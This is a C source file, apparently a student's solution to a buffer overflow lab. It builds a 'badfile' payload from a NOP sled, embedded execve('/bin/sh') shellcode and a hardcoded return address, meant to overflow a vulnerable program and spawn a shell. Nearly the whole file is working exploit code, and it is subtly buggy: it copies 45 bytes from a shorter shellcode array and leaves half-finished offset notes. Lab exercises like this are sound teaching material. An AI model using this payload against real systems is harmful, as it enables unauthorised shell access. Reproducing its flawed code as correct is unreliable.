/* exploit.c */
/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
"\x31\xc0" /* xorl %eax,%eax */
"\x50" /* pushl %eax */
"\x68""//sh" /* pushl $0x68732f2f */
"\x68""/bin" /* pushl $0x6e69622f */
"\x89\xe3" /* movl %esp,%ebx */
"\x50" /* pushl %eax */
"\x53" /* pushl %ebx */
"\x89\xe1" /* movl %esp,%ecx */
"\x99" /* cdq */
"\xb0\x0b" /* movb $0x0b,%al */
"\xcd\x80" /* int $0x80 */
;
char garbo[] = "\x10";
char location[]=
"\x60"
"\xf1"
"\xff"
"\xbf"
;
void main(int argc, char **argv)
{
char buffer[517];
FILE *badfile;
/* Initialize buffer with 0x90 (NOP instruction) */
memset(&buffer, 0x90, 517);
/* You need to fill the buffer with appropriate contents here */
//533
//533-45 = 488
//488 -4 = 484
int i=0;
for(;i<45;i++){
   buffer[468+i] = shellcode[i];
}
i=0;
//originally used to find eip. 36 was my eip location back when then buffer was of size 24
/*
for(;i<40;i++){
   buffer[36+i] = garbo[0];
}
*/

for(;i<4;i++){
   buffer[46+i] = location[i];
}


/* Save the contents to the file "badfile" */
badfile = fopen("./badfile", "w");
fwrite(buffer, 517, 1, badfile);
fclose(badfile);
}
